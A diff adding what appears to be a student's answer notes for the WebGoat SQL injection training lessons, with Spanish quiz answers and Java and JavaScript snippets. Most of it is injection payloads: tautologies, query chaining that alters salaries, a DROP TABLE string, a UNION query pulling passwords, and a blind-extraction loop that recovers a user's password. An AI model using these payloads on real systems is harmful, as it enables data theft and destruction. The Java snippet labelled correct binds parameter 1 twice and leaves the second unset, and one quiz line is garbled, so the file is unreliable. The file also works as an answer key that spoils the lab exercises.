@@ -1,0 +1,135 @@
+Injection Flaws - SQL Injection (Introduction)
+
+# retrieve the department of the employee Bob Franco
+SELECT department FROM employees WHERE first_name = 'Bob';
+
+---------------------------------------------------------------------------------------
+Data Manipulation Language (DML)
+
+UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi';
+
+---------------------------------------------------------------------------------------
+Data Definition Language (DDL)
+
+
+# add the column "phone" (varchar(20)) to the table "employees
+ALTER TABLE employees ADD COLUMN phone varchar(20);
+
+------------------------------------------------------------------------------------
+Data Control Language (DCL)
+
+GRANT ALTER TABLE TO UnauthorizedUser;
+
+------------------------------------------------------------------------------------
+Try It! String SQL Injection
+Login_count - 1
+User_Id - 1 OR 1=1
+
+----------------------------------------------------------------------------
+Try It! Numeric SQL Injection
+
+Login_count - 1
+User_Id - 1 OR 1=1
+
+----------------------------------------------------------------------------
+Compromising confidentiality with String SQL injection
+
+Employee Name - blah
+Authentication TAN - 123' OR '1' = '1
+
+----------------------------------------------------------------------------
+Compromising Integrity with Query chaining
+
+Employee Name - blah
+Authentication TAN - 123'; UPDATE employees SET salary = 100000 WHERE auth_tan = '3SL99A
+
+----------------------------------------------------------------------------
+Compromising Availability
+
+Action contains - blah'; DROP table access_logs; --
+
+============================================================================
+Injection Flaws - SQL Injection (Advanced)
+Try It! Pulling data from other tables
+
+Smith' union all select userid, user_name, user_name, user_name, user_name, password, userid from user_system_data;--
+
+----------------------------------------------------------------------------
+Goal: Can you login as Tom?
+testuser
+testuser@test.com
+password:12345
+
+testuser' AND '1'='1
+testuser' AND '1'='2
+
+tom' AND substring(password,1,1)='t
+tom' AND substring(password,2,1)='h
+tom' AND substring(password,3,1)='i
+tom' AND substring(password,4,1)='s
+
+
+
+
+
+
+password=thisisasecretfortomonly
+
+ CUESTIONARIO
+ 1. ¿Cuál es la diferencia entre una declaración preparada y una declaración?
+Solución 4: una declaración tiene valores en lugar de una declaración preparada
+
+2. ¿Cuál de los siguientes caracteres es un marcador de posición para las variables?
+Solución 3:?
+
+
+3. ¿Cómo pueden las declaraciones preparadas ser más rápidas que las declaraciones?
+Solución 2: Las declaraciones preparadas son compiladas una vez por el sistema de gestión de la base de datos a la espera de entrada 
+             y se compilan previamente de esta manera.
+
+
+4. ¿Cómo puede una declaración preparada evitar la inyección de SQL?
+Solución 3: los marcadores de posición pueden evitar que la entrada de los usuarios se adjunte a la consulta SQL, lo que resulta en una separación de código y datos.
+
+
+5. Qué sucede si una persona con intenciones maliciosas escribe en un formulario de registro: Robert); TABLA DE GOTA Estudiantes; ¿tiene una declaración preparada?
+Solución 4: La base de datos registra 'Robert'); TABLA DE GOTA Estudiantes; - '.
+
+==============================================================================================
+=======================  CORRECTO =======================================================
+Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
+PreparedStatement ps = conn.prepareStatement("SELECT status FROM users WHERE name= ?  AND mail= ? ");
+ps.setString(1,pname);
+ps.setString(1,pmail);
+=============================================================================
+============== Comn Dios somos todos, sin Dios no somos nada ================
+
+String accountName =null;
+PreparedStatement stmt = null;
+  try{
+      Connection conn = null;
+      conn = DriverManager.getConnection(DBURL,DBUSER,DBPW);
+      String query = "SELECT * FROM users WHERE name = ?";
+      stmt = conn.prepareStatement(query);
+      stmt.setString(1, accountName);
+      ResultSet rs = stmt.executeQuery();
+      rs.close();
+      stmt.close();
+      conn.close();
+   }catch(SQLException se){
+      //Handle errors for JDBC
+      se.printStackTrace();
+   }catch(Exception e){
+      //Handle errors for Class.forName
+      e.printStackTrace();
+   }
+   
+ ===============================================Snippet para ===================
+ =============================================== Ejercicio 8 ===================
+Array.from({ length:10 },(_, k) => k).forEach(item => {
+	fetch(`http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=(case when exists(select id from servers where hostname='webgoat-prd' and substring(ip,1,1)=${item}) then id else ip end)`)
+	  .then(response => response.json())
+	  .then(result => console.log(`result - ${item}`, result));
+});
+
+
